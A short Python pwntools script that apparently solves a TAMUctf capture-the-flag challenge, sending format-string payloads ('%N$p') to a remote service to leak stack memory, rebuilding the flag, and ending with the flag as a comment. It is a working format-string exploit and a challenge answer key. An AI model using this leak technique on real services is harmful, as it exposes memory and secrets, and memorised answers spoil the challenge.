from pwn import *
flag=""
p = remote('challenges.tamuctf.com', 4251)
for i in xrange(8,0xff):
    p.sendlineafter('(EaaS)\n', '%{:d}$p'.format(i))
    res = p.recvline().strip()
    if '00' in res or 'nil' in res:
        p.close()
        break
    flag += p64(eval(res))    

log.success(flag)
# gigem{3asy_f0rmat_vuln1}